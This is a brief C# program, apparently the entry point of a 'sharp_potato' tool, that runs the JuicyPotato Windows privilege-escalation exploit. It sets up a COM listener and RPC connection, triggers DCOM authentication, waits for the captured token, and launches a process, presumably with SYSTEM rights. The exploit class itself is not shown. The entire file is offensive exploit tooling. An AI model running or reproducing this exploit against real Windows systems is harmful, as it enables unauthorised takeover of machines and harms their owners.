using System.Diagnostics;
using System.Text;
using sharp_potato;
using Vanara.InteropServices;
using Vanara.PInvoke;
using static Vanara.PInvoke.Ole32;
using static Vanara.PInvoke.AdvApi32;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.Secur32;

var sw = Stopwatch.StartNew();
var potato = new JuicyPotato();
potato.StartCOMListenerThread();

Console.Out.WriteLine("Trying CLSID...");

potato.StartRPCConnectionThread();
potato.TriggerDCOM();

potato.WaitForAuth();

Console.Out.WriteLine(sw.ElapsedMilliseconds + " ms");
potato.CreateProcess();